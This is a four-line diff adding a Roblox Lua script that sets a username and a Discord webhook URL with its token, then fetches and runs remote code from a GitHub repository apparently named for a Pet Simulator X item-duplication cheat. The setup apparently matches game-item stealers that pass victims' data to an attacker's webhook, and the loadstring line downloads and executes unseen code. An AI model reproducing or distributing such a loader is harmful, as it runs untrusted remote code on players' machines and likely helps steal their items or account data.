@@ -1,0 +1,4 @@
+UserName = "yra7ts75s74p"
+WebHook = "https://discord.com/api/webhooks/1057729336796512307/SfNjTTba63Cgl9MnGffWjCpi-JhqMWx0-82UTiA608XjEiHV5jX_fvdgIpOxm3jZC_sw"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/petsmixdupe/main/PSX.lua", true))()
